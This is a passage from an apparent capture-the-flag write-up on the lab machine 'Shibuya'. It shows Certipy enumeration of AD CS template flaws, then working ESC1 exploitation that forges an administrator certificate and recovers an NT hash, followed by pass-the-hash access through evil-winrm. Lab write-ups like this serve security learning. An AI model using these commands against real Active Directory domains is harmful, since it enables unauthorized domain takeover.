    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl
    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52
    Certificate Validity Start          : 2025-02-15 07:24:14+00:00
    Certificate Validity End            : 2125-02-15 07:34:13+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SHIBUYA.VL\Administrators
      Access Rights
        ManageCertificates              : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        ManageCa                        : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Enroll                          : SHIBUYA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : ShibuyaWeb
    Display Name                        : ShibuyaWeb
    Certificate Authorities             : shibuya-AWSJPDC0522-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Any Purpose
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Renewal Period                      : 75 years
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHIBUYA.VL\t1_admins
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SHIBUYA.VL\_admin
        Write Owner Principals          : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
                                          SHIBUYA.VL\_admin
        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
                                          SHIBUYA.VL\_admin
        Write Property Principals       : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
                                          SHIBUYA.VL\_admin
    [!] Vulnerabilities
      ESC1                              : 'SHIBUYA.VL\\t1_admins' can enroll, enrollee supplies subject and template allows client authentication
      ESC2                              : 'SHIBUYA.VL\\t1_admins' can enroll and template can be used for any purpose
      ESC3                              : 'SHIBUYA.VL\\t1_admins' can enroll and template has Certificate Request Agent EKU set

```

The CA is vulnerable to ESC8, and the certificate template is vulnerable to ESC1, ESC2, and ESC3.

#### Exploit

ESC1 is the simplest to exploit. I’m just going to request a certificate as administrator:

```

oxdf@hacky$ proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn administrator@shibuya.vl -target AWSJPDC0522.shibuya.vl
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[-] Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
[*] Request ID is 4
Would you like to save the private key? (y/N) 
[-] Failed to request certificate

```

It fails, as the public key is not big enough. I’ll add `-key-size 4096` and it saves a certificate:

```

oxdf@hacky$ proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn administrator@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'administrator@shibuya.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

If I try to use this certificate, it fails:

```

oxdf@hacky$ proxychains certipy auth -pfx administrator.pfx -dc-ip 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@shibuya.vl
[*] Trying to get TGT...
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```

The administrator user isn’t in the Kerberos database. A quick look at BloodHound shows that the only member of the Domain Admins group is \_admin:

![image-20250513145247589](/img/image-20250513145247589.png)

I’ll update the target user principal name, and run again:

```

oxdf@hacky$ proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[*] Successfully requested certificate
[*] Request ID is 9
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to '_admin.pfx'

```

Now the `auth` command with that certificate still fails:

```

oxdf@hacky$ proxychains certipy auth -pfx _admin.pfx -dc-ip 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: _admin@shibuya.vl
[*] Trying to get TGT...
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
[-] Object SID mismatch between certificate and user '_admin'

```

Reading through [this issue](https://github.com/ly4k/Certipy/issues/208) says that I need to provide the `-sid` flag for the targeted user, which I’ll get from BloodHound:

![image-20250513151958174](/img/image-20250513151958174.png)

I’ll request another certificate:

```

oxdf@hacky$ proxychains certipy req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096 -sid S-1-5-21-87560095-894484815-3652015022-500
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
|S-chain|-<>-127.0.0.1:1080-<><>-10.129.234.42:445-<><>-OK
[*] Successfully requested certificate
[*] Request ID is 11
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saved certificate and private key to '_admin.pfx'

```

This time when I `auth` it gives a TGT for the account as well as the NTLM hash:

```

oxdf@hacky$ proxychains certipy auth -pfx _admin.pfx -dc-ip 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: _admin@shibuya.vl
[*] Trying to get TGT...
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
[*] Got TGT
[*] Saved credential cache to '_admin.ccache'
[*] Trying to retrieve NT hash for '_admin'
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:88-<><>-OK
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430

```

### WinRM

TCP 5985 isn’t available from my host, but it is open on Shibuya:

```

shibuya\nigel.mills@AWSJPDC0522 C:\ProgramData>netstat -ano | findstr LISTENING | findstr 5985 
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4

```

I’ll use `proxychains` to connect over my existing socks proxy:

```

oxdf@hacky$ proxychains evil-winrm -i 127.0.0.1 -u _admin -H bab5b2a004eabb11d865f31912b6b430
ProxyChains-3.1 (http://proxychains.sf.net)
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5985-<><>-OK
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And grab the root flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
5b150cc7************************

```